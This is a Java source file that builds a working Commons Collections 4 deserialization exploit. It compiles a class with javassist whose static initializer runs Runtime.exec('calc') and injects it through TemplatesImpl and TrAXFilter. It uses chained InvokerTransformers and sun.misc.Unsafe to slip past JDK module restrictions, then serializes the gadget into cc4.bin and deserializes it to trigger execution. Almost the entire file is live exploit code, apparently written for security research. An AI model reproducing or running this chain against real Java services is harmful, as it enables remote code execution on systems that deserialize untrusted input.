package com.test;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.*;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4_nullModule {
    public static void main(String[] args) throws Exception {

//        Field field = Module.class.getDeclaredField("name");
        // Module.name获取不到
        Field field = Class.class.getDeclaredField("module");
        bypassModule.getOffset(field);
        // packageName偏移量为60，module偏移量为48
        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath("java.io")
        pool.importPackage("java.io");
        CtClass ctClass = pool.makeClass("Calc");
        CtConstructor staticBlock = ctClass.makeClassInitializer();
        staticBlock.setBody("        try {\n" +
                "            Runtime.getRuntime().exec(\"calc\");\n" +
                "        } catch (IOException e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");

        ClassPool pool1 = ClassPool.getDefault();
        CtClass ctClass1 = pool1.makeClass("Useless");

        byte[] bytecode = ctClass.toBytecode();
        byte[] bytecode1 = ctClass1.toBytecode();

        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        bypassModule.patchModule(CC4_nullModule.class, aClass);
        Object templates = aClass.newInstance();
        setFieldValue(templates, "_name", "123");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecode, bytecode1});
        setFieldValue(templates, "_transletIndex", 0);


        Class<?> TrAXFilter = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer invokerTransformer9 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        ConstantTransformer constantTransformer2 = new ConstantTransformer(TrAXFilter);


        Class UnsafeClass = Class.forName("sun.misc.Unsafe");
        InvokerTransformer invokerTransformer8 = new
                InvokerTransformer("getAndSetObject", new Class[]
                {Object.class, long.class, Object.class}, new Object[]
                {InstantiateTransformer.class, 48, null});

        InvokerTransformer invokerTransformer7 = new
                InvokerTransformer("get", new Class[]{Object.class}, new Object[]
                {null});
        InvokerTransformer invokerTransformer6 = new
                InvokerTransformer("setAccessible", new Class[]{boolean.class},
                new Object[]{true});
        TransformerClosure transformerClosure1 = new
                TransformerClosure(invokerTransformer6);
        ClosureTransformer ClosureTransformer1 = new
                ClosureTransformer(transformerClosure1);
        InvokerTransformer invokerTransformer5 = new
                InvokerTransformer("getDeclaredField", new Class[]{String.class},
                new Object[]{"theUnsafe"});
        ConstantTransformer constantTransformer1 = new ConstantTransformer(UnsafeClass);

        InvokerTransformer invokerTransformer4 = new
                InvokerTransformer("getAndSetObject", new Class[]
                {Object.class, long.class, Object.class}, new Object[]
                {TrAXFilter, 48, null});

        InvokerTransformer invokerTransformer3 = new
                InvokerTransformer("get", new Class[]{Object.class}, new Object[]
                {null});
        InvokerTransformer invokerTransformer2 = new
                InvokerTransformer("setAccessible", new Class[]{boolean.class},
                new Object[]{true});
        TransformerClosure transformerClosure = new
                TransformerClosure(invokerTransformer2);
        ClosureTransformer ClosureTransformer = new
                ClosureTransformer(transformerClosure);
        InvokerTransformer invokerTransformer = new
                InvokerTransformer("getDeclaredField", new Class[]{String.class},
                new Object[]{"theUnsafe"});
        ConstantTransformer constantTransformer = new
                ConstantTransformer(UnsafeClass);

        Transformer[] transformers=new Transformer[]
                {constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3, invokerTransformer4,
                        constantTransformer1, invokerTransformer5, ClosureTransformer1, invokerTransformer7, invokerTransformer8, constantTransformer2, invokerTransformer9};
        Transformer keyTransformer = new
                ChainedTransformer(transformers);

        System.out.println(TrAXFilter.getModule());
        System.out.println(InvokerTransformer.class.getModule());

        TransformingComparator transformingComparator = new TransformingComparator(keyTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);

        bypassModule.patchModule(CC4_nullModule.class, PriorityQueue.class);
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.setInt(priorityQueue, 2);

//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileOutputStream fos = new FileOutputStream("cc4.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(priorityQueue);
        oos.close();


        FileInputStream fis = new FileInputStream("cc4.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();

    }

    public static void setFieldValue (Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
